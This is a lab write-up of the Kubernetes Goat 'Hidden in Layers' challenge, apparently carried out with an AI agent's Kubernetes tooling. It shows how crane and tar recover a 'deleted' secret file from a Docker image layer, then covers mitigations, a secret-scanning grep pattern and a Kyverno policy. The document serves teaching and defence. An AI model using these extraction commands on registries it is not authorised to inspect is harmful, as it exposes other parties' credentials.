# Scenario 15: Hidden in Layers

## Overview

This challenge demonstrates a critical container security concept: Docker image layers are immutable. When developers add sensitive files during image builds and then "delete" them in subsequent Dockerfile instructions, those files remain fully recoverable from the earlier layers. Anyone with image pull access can extract secrets that were supposedly removed.

## Attack Vector

Docker images are built using a layered filesystem. Each Dockerfile instruction creates a new layer:

```dockerfile
FROM alpine                          # Layer 1: Base image
COPY secret.txt /root/secret.txt     # Layer 2: Secret added
RUN rm /root/secret.txt              # Layer 3: "Deleted" (whiteout marker only)
```

The `rm` command doesn't remove `secret.txt` - it creates a "whiteout" marker in Layer 3 that hides the file from the final filesystem view. The original file persists in Layer 2 and can be extracted by anyone.

## Tools Used

- **kubectl** - Kubernetes resource inspection
- **crane** - Container registry CLI (Google go-containerregistry)
- **tar** - Layer extraction
- **jq** - JSON parsing

## Attack Walkthrough

### Step 1: Identify the Target

Listed running jobs in the cluster to find the hidden-in-layers workload:

```bash
kubectl get jobs
```

**Result**:
```
NAME               STATUS   COMPLETIONS   DURATION   AGE
hidden-in-layers   Failed   0/1           4d3h       12d
```

### Step 2: Extract the Container Image Name

Used Kubernetes MCP to inspect the Job resource:

```bash
kubectl get job hidden-in-layers -o jsonpath='{.spec.template.spec.containers[0].image}'
```

**Result**:
```
madhuakula/k8s-goat-hidden-in-layers
```

### Step 3: Inspect Image Build History

Used crane to view the image configuration and history without pulling the full image:

```bash
crane config madhuakula/k8s-goat-hidden-in-layers | jq '.history'
```

**Result**:
```json
[
  {
    "created": "2023-11-30T23:22:52.632616385Z",
    "created_by": "/bin/sh -c #(nop) ADD file:... in / "
  },
  {
    "created": "2023-11-30T23:22:52.738129857Z",
    "created_by": "/bin/sh -c #(nop)  CMD [\"/bin/sh\"]",
    "empty_layer": true
  },
  {
    "created": "2023-12-06T00:19:26.504923964Z",
    "created_by": "LABEL MAINTAINER=Madhu Akula INFO=Kubernetes Goat",
    "empty_layer": true
  },
  {
    "created": "2023-12-06T00:19:26.504923964Z",
    "created_by": "ADD secret.txt /root/secret.txt # buildkit"
  },
  {
    "created": "2023-12-06T00:19:26.593122798Z",
    "created_by": "RUN /bin/sh -c echo \"Contributed by Rewanth Cool\" >> /root/contribution.txt     && rm -rf /root/secret.txt # buildkit"
  },
  {
    "created": "2023-12-06T00:19:26.593122798Z",
    "created_by": "CMD [\"sh\" \"-c\" \"tail -f /dev/null\"]",
    "empty_layer": true
  }
]
```

**Key Finding**:
- Layer 4: `ADD secret.txt /root/secret.txt` - A secret file was added
- Layer 5: `rm -rf /root/secret.txt` - The secret was "deleted"

The pattern is clear: a secret was added then removed - but it still exists in the earlier layer!

### Step 4: Identify Target Layer

Retrieved the image manifest to get individual layer digests:

```bash
crane manifest madhuakula/k8s-goat-hidden-in-layers | jq '.manifests[] | select(.platform.architecture=="amd64")'
```

Then fetched the platform-specific manifest:

```bash
crane manifest madhuakula/k8s-goat-hidden-in-layers@sha256:9b7bf138b331c4021c7484215b25e96e2a3410e001db2b5ac47671be502a0032 | jq '.layers'
```

**Result**:
```json
[
  {
    "digest": "sha256:c926b61bad3b94ae7351bafd0c184c159ebf0643b085f7ef1d47ecdc7316833c",
    "size": 3402422
  },
  {
    "digest": "sha256:23ee7dbcfc2d36292d16d539dc57a584d0a8d4534e366fb565c4ba2c2f796255",
    "size": 172
  },
  {
    "digest": "sha256:b9598d7111a2ab830d3e977d554fbddae18a4c1240d8a12eb1ae07bf35702c13",
    "size": 194
  }
]
```

**Analysis**:
- Layer 1 (3.4 MB): Base Alpine image
- Layer 2 (172 bytes): The secret.txt file - tiny layer, perfect match
- Layer 3 (194 bytes): The rm command and contribution.txt

### Step 5: Extract the Secret Layer

Listed the contents of the suspicious layer:

```bash
crane blob madhuakula/k8s-goat-hidden-in-layers@sha256:23ee7dbcfc2d36292d16d539dc57a584d0a8d4534e366fb565c4ba2c2f796255 | tar -tzv
```

**Result**:
```
drwx------ 0/0               0 2023-12-06 00:19 root/
-rw-r--r-- 0/0              41 2023-02-12 20:57 root/secret.txt
```

**Confirmed**: The "deleted" secret.txt (41 bytes) exists in this layer!

### Step 6: Recover the Secret

Extracted the file contents:

```bash
crane blob madhuakula/k8s-goat-hidden-in-layers@sha256:23ee7dbcfc2d36292d16d539dc57a584d0a8d4534e366fb565c4ba2c2f796255 | tar -xzO root/secret.txt
```

**Result**:
```
k8s-goat-[REDACTED]
```

## Key Lessons

### How Docker Layers Work

| Concept | Description |
|---------|-------------|
| **Immutable Layers** | Each Dockerfile instruction creates a read-only layer |
| **Union Filesystem** | Layers stack on top of each other; upper layers can hide lower files |
| **Whiteout Files** | `rm` creates marker files (`.wh.filename`) that hide files from view |
| **Layer Digests** | Each layer has a unique SHA256 digest for extraction |

### Why "Deleting" Doesn't Work

```dockerfile
# Vulnerable Pattern
FROM alpine
COPY credentials.json /app/
RUN ./setup.sh && rm /app/credentials.json  # Still in previous layer!
```

The container runtime sees:
```
Layer 1: Alpine base
Layer 2: credentials.json exists at /app/credentials.json
Layer 3: .wh.credentials.json (whiteout marker)
```

The final merged view hides the file, but Layer 2 is still part of the image and can be individually extracted.

### Image Inspection Commands

| Purpose | Command |
|---------|---------|
| View build history | `crane config <image> \| jq '.history'` |
| Get layer digests | `crane manifest <image> \| jq '.layers'` |
| List layer contents | `crane blob <image>@<digest> \| tar -tzv` |
| Extract specific file | `crane blob <image>@<digest> \| tar -xzO <path>` |
| Interactive analysis | `dive <image>` |

### Alternative Tools

| Tool | Purpose |
|------|---------|
| `docker history --no-trunc` | View build commands (requires pulled image) |
| `docker save` + `tar` | Export and extract layers locally |
| `dive` | Interactive TUI for layer exploration |
| `skopeo` | Alternative registry CLI |
| `trivy` | Scan for secrets in all layers |

## Mitigations

### Multi-Stage Builds (Recommended)

```dockerfile
# Secure Pattern
FROM alpine AS builder
COPY secrets.json /tmp/
RUN ./setup.sh --config /tmp/secrets.json

FROM alpine
COPY --from=builder /app/output /app/
# secrets.json never exists in final image
```

### Docker BuildKit Secrets

```dockerfile
# syntax=docker/dockerfile:1.4
FROM alpine
RUN --mount=type=secret,id=mysecret \
    cat /run/secrets/mysecret > /dev/null && \
    ./setup.sh
```

Build command:
```bash
docker build --secret id=mysecret,src=./secret.txt .
```

### Pre-Publish Scanning

```bash
#!/bin/bash
# scan-before-push.sh
IMAGE=$1

echo "=== Checking for secrets in all layers ==="
trivy image --scanners secret $IMAGE

echo "=== Analyzing with dive ==="
dive $IMAGE --ci --lowestEfficiency 0.9

echo "=== Manual history review ==="
crane config $IMAGE | jq -r '.history[] | .created_by' | grep -iE "secret|password|key|token|credential"
```

### Policy Enforcement

```yaml
# Kyverno policy to block images with too many layers (suspicious rebuilds)
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: limit-image-layers
spec:
  validationFailureAction: audit
  rules:
  - name: check-layer-count
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "Images with excessive layers may contain hidden secrets"
      deny:
        conditions:
        - key: "{{ images.*.layers | length(@) }}"
          operator: GreaterThan
          value: 10
```

## Real-World Incidents

| Incident | Description |
|----------|-------------|
| **Codecov Breach (2021)** | Credentials in Docker layers led to supply chain attack |
| **Various Docker Hub images** | Researchers found thousands of images with exposed AWS keys |
| **CI/CD Pipeline Leaks** | Build systems commonly add then "remove" secrets |

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Unsecured Credentials in Files | T1552.001 | Secrets recoverable from image layers |
| Container Image Discovery | T1613 | Analyzing images to find sensitive data |
| Data from Information Repositories | T1213 | Extracting secrets from container registries |

## Commands Reference

```bash
# Inspect image configuration and history
crane config <image> | jq '.'

# Get image manifest with layer digests
crane manifest <image> | jq '.layers'

# For multi-arch images, get platform-specific manifest
crane manifest <image>@<platform-digest> | jq '.layers'

# List contents of a specific layer
crane blob <image>@sha256:<layer-digest> | tar -tzv

# Extract specific file from layer
crane blob <image>@sha256:<layer-digest> | tar -xzO path/to/file

# Export entire image filesystem
crane export <image> - | tar -tvf -

# Interactive layer analysis
dive <image>

# Scan for secrets in all layers
trivy image --scanners secret <image>
```

## References

- [Docker Image Layer Documentation](https://docs.docker.com/storage/storagedriver/)
- [BuildKit Secrets Documentation](https://docs.docker.com/develop/develop-images/build_enhancements/#new-docker-build-secret-information)
- [Dive - Image Layer Analysis Tool](https://github.com/wagoodman/dive)
- [OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
- [Trivy Secret Scanning](https://aquasecurity.github.io/trivy/latest/docs/scanner/secret/)
